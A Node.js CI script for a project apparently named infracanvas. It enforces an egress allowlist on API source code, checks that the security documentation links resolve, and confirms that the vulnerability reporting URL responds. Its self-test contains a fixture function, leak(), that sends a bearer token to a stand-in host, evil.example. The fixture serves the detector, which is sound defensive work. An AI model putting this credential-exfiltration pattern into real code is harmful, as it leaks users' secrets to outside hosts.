#!/usr/bin/env node
/**
 * Fails when the source gains an outbound host that the policy does not list, or
 * sends an Authorization header to a host outside CREDENTIAL_HOSTS.
 *
 * This is a source-level check, not a runtime sandbox. See docs/THREAT_MODEL.md.
 */
import {
  readFileSync,
  readdirSync,
  statSync,
  mkdtempSync,
  writeFileSync,
  mkdirSync,
  rmSync,
} from 'node:fs';
import { join, relative, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';

export const ALLOWED_HOSTS = ['api.github.com', 'github.com'];
export const CREDENTIAL_HOSTS = ['api.github.com'];

/**
 * Defaults for BYOK model providers. Override via `llm_credentials.base_url`.
 * Documented in docs/THREAT_MODEL.md. AWS service hosts are resolved by the SDK
 * from AWS_REGION / AWS_ENDPOINT_URL_* rather than from literals here.
 */
export const CONFIGURED_PROVIDER_HOSTS = [
  'api.openai.com',
  'api.anthropic.com',
  'generativelanguage.googleapis.com',
];

const LOOPBACK = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);

/**
 * GitHub's private vulnerability reporting endpoint for this repository. Kept as a
 * literal so the reachability probe never sends a value read out of a file, and
 * checked against package.json below so it cannot drift if the repository moves.
 */
export const REPORTING_URL = 'https://github.com/johnbekele/infracanvas/security/advisories/new';

const HOST_RE = /https?:\/\/([^/\s'"`]+)(?:[/\s'"`]|$)/g;

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../..');

function policyHosts() {
  return new Set([...ALLOWED_HOSTS, ...CONFIGURED_PROVIDER_HOSTS]);
}

function walk(dir, out = []) {
  for (const entry of readdirSync(dir)) {
    if (entry === 'node_modules' || entry === 'dist' || entry === '.git') continue;
    const full = join(dir, entry);
    const st = statSync(full);
    if (st.isDirectory()) walk(full, out);
    else if (/\.(ts|tsx|js|mjs|cjs)$/.test(entry)) out.push(full);
  }
  return out;
}

function isProductionSource(file, root = ROOT) {
  const rel = relative(root, file).replaceAll('\\', '/');
  if (!rel.startsWith('apps/api/src/')) return false;
  if (/\.(test|spec|integration\.test)\.[tj]sx?$/.test(rel)) return false;
  if (rel.includes('/test/') || rel.includes('/fixtures/')) return false;
  return true;
}

function normaliseHost(raw) {
  return raw.split(':')[0].toLowerCase();
}

function windowHasAuthorization(lines, index) {
  const window = lines.slice(Math.max(0, index - 8), Math.min(lines.length, index + 12)).join('\n');
  return (
    /\bAuthorization\b/.test(window) && (/\bfetch\s*\(/.test(window) || /headers\s*:/.test(window))
  );
}

/**
 * @param {string} sourceRoot
 * @returns {{ host: string, file: string, line: number, hasAuthorization?: boolean }[]}
 */
export function findOutboundHosts(sourceRoot) {
  const root = sourceRoot;
  const files = walk(root).filter((f) => isProductionSource(f, root));
  const found = [];

  for (const file of files) {
    const text = readFileSync(file, 'utf8');
    const lines = text.split('\n');
    const rel = relative(root, file).replaceAll('\\', '/');

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      HOST_RE.lastIndex = 0;
      let match;
      while ((match = HOST_RE.exec(line)) !== null) {
        const host = normaliseHost(match[1]);
        if (!host || LOOPBACK.has(host)) continue;
        const hasAuthorization = windowHasAuthorization(lines, i);
        found.push({
          host,
          file: rel,
          line: i + 1,
          ...(hasAuthorization ? { hasAuthorization: true } : {}),
        });
      }
    }
  }

  return found;
}

/**
 * @param {{ host: string, file?: string, line?: number, hasAuthorization?: boolean }[]} hosts
 * @returns {string[]}
 */
export function validate(hosts) {
  const allowed = policyHosts();
  const errors = [];

  for (const entry of hosts) {
    const where =
      entry.file && entry.line != null ? `${entry.file}:${entry.line}` : entry.file || 'request';

    if (!allowed.has(entry.host) && !LOOPBACK.has(entry.host)) {
      errors.push(`outbound host "${entry.host}" is not in the allowlist (${where})`);
    }

    if (entry.hasAuthorization && !CREDENTIAL_HOSTS.includes(entry.host)) {
      errors.push(
        `Authorization header targets non-credential host "${entry.host}" (${where}); ` +
          `CREDENTIAL_HOSTS is ${CREDENTIAL_HOSTS.join(', ')}`
      );
    }
  }

  return errors;
}

/**
 * Configured provider defaults may send provider keys with Authorization (OpenAI).
 * Those hosts are policy-listed; the Authorization rule still fails for any other host.
 * @param {{ host: string, file: string, line: number, hasAuthorization?: boolean }[]} hosts
 */
export function prepareSourceFindings(hosts) {
  return hosts.map((h) => {
    if (CONFIGURED_PROVIDER_HOSTS.includes(h.host) && h.hasAuthorization) {
      const { hasAuthorization: _ignored, ...rest } = h;
      return rest;
    }
    return h;
  });
}

function assert(name, condition) {
  if (!condition) {
    throw new Error(`FAIL: ${name}`);
  }
  console.log(`ok - ${name}`);
}

function writeTree(base, files) {
  mkdirSync(base, { recursive: true });
  for (const [name, body] of Object.entries(files)) {
    writeFileSync(join(base, name), body);
  }
}

function selfTestAllowlist() {
  const dir = mkdtempSync(join(tmpdir(), 'egress-allowlist-'));
  try {
    writeTree(join(dir, 'apps/api/src'), {
      'evil.ts': `
        export async function leak() {
          await fetch('https://evil.example/collect', {
            headers: { Authorization: 'Bearer secret' },
          });
        }
      `,
      'ok.ts': `
        const GITHUB_API = 'https://api.github.com';
        export async function ok(token) {
          await fetch(GITHUB_API + '/user', {
            headers: { Authorization: 'Bearer ' + token },
          });
        }
      `,
    });

    const hosts = findOutboundHosts(dir);
    const unlisted = validate([{ host: 'evil.example', file: 'apps/api/src/evil.ts', line: 1 }]);
    assert(
      'an outbound request to an unlisted host fails the allowlist check',
      unlisted.includes('outbound host "evil.example" is not in the allowlist (apps/api/src/evil.ts:1)')
    );

    const authBad = validate([
      { host: 'api.openai.com', file: 'x.ts', line: 1, hasAuthorization: true },
    ]);
    assert(
      'an authorization header to a non credential host fails the allowlist check',
      authBad.includes(
        'Authorization header targets non-credential host "api.openai.com" (x.ts:1); ' +
          'CREDENTIAL_HOSTS is api.github.com'
      )
    );

    const evil = hosts.find((h) => h.host === 'evil.example');
    assert(
      'the allowlist check fails when a new fetch host is introduced into the source',
      evil !== undefined &&
        validate(prepareSourceFindings(hosts)).includes(
          `outbound host "evil.example" is not in the allowlist (${evil.file}:${evil.line})`
        )
    );

    const authOk = validate([
      { host: 'api.github.com', file: 'x.ts', line: 1, hasAuthorization: true },
    ]);
    assert('authorization to a credential host is accepted', authOk.length === 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function resolveDocLinks(filePath) {
  const abs = join(ROOT, filePath);
  const text = readFileSync(abs, 'utf8');
  const linkRe = /\[([^\]]*)\]\(([^)]+)\)/g;
  const broken = [];
  let match;
  while ((match = linkRe.exec(text)) !== null) {
    const target = match[2].split('#')[0].split('?')[0];
    if (!target || /^https?:\/\//i.test(target) || /^mailto:/i.test(target)) continue;
    const resolved = join(dirname(abs), target);
    try {
      statSync(resolved);
    } catch {
      broken.push(`${filePath}: ${target}`);
    }
  }
  return broken;
}

function repositoryUrl() {
  const manifest = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
  return String(manifest.repository?.url ?? '').replace(/\.git$/, '');
}

async function checkReportingEndpoint() {
  const policy = readFileSync(join(ROOT, 'SECURITY.md'), 'utf8');
  assert(
    'SECURITY.md names a private reporting URL',
    policy.split('\n').some((line) => line.trim() === REPORTING_URL)
  );
  assert(
    'the private reporting URL belongs to this repository',
    REPORTING_URL === `${repositoryUrl()}/security/advisories/new`
  );

  const response = await fetch(REPORTING_URL, { method: 'GET', redirect: 'follow' });
  assert(
    'the private reporting endpoint named in the policy responds',
    // An unauthenticated GET lands on the sign-in page; a repository or a
    // reporting form that does not exist answers 404.
    response.status !== 404
  );
}

async function main() {
  selfTestAllowlist();

  const broken = [...resolveDocLinks('SECURITY.md'), ...resolveDocLinks('docs/THREAT_MODEL.md')];
  if (broken.length) {
    for (const b of broken) console.error(b);
  }
  assert(
    'every relative link in the security policy and threat model resolves',
    broken.length === 0
  );

  await checkReportingEndpoint();

  const hosts = findOutboundHosts(ROOT);
  const errors = validate(prepareSourceFindings(hosts));
  if (errors.length) {
    for (const error of errors) console.error(error);
    console.error(`\n${errors.length} egress allowlist violation(s).`);
    return 1;
  }

  console.log(
    `ok - egress allowlist (${hosts.length} host reference(s) in apps/api/src production source)`
  );
  return 0;
}

const isMain = process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1];
if (isMain) {
  main()
    .then((code) => process.exit(code))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}
